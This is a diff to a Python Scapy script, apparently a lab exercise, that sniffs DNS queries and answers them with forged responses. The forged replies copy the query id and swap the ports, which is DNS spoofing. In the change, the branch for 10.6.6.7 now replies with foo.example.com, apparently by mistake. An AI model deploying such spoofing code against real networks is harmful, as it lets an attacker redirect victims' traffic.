@@ -13,20 +13,22 @@ def querySniff(packet):
     # our interception packet
     # String slice to get just the dst ip
     if packet.summary()[30:38] == "10.6.6.6":
-        dr0 = IP(src=packet[IP].dst, dst=packet[IP].src) /\
-            UDP(sport=packet[UDP].sport, dport=53) /\
-            DNS(id=packet[DNS].id, rd=1, qd=DNSQR(qname="foo.example.com"))
+        dr0 = Ether()/\
+            IP(src=packet[IP].dst, dst=packet[IP].src) /\
+            UDP(sport=53, dport=packet[UDP].sport) /\
+            DNS(id=packet[DNS].id, rd=1, qr=1, qd=DNSQR(qname=b"foo.example.com"))    
         send(dr0)
     elif packet.summary()[30:38] == "10.6.6.7":
-        dr0 = IP(src=packet[IP].dst, dst=packet[IP].src) /\
-            UDP(sport=packet[UDP].sport, dport=53) /\
-            DNS(id=packet[DNS].id, rd=1, qd=DNSQR(qname="bar.example.com"))
+        dr0 = Ether()/\
+            IP(src=packet[IP].dst, dst=packet[IP].src) /\
+            UDP(sport=53, dport=packet[UDP].sport) /\
+            DNS(id=packet[DNS].id, rd=1, qr=1, qd=DNSQR(qname=b"foo.example.com"))    
         send(dr0)
 
 
 def main(interface="wlp2s0", hostnames="hostnames"):
 
-    print("Working...")
+    print("Sniffing...")
     # https://www.geeksforgeeks.org/packet-sniffing-using-scapy/
     # https://stackoverflow.com/questions/24792462/python-scapy-dns-sniffer-and-parser
     # https://null-byte.wonderhowto.com/how-to/build-dns-packet-sniffer-with-scapy-and-python-0163601/
@@ -35,12 +37,8 @@ def main(interface="wlp2s0", hostnames="hostnames"):
                         count=1, prn=querySniff)
 
         print("CAPTURE: ", capture)
-    print("Done sniffing")
 
-    dr0 = IP(src=packetList[0][IP].dst, dst=packetList[0][IP].src) /\
-        UDP(sport=packetList[0][UDP].sport, dport=53) /\
-        DNS(id=packetList[0][DNS].id, rd=1, qd=DNSQR(qname="example.com"))
-    send(dr0)
+    print("Done sniffing")
 
 
 if __name__ == "__main__":
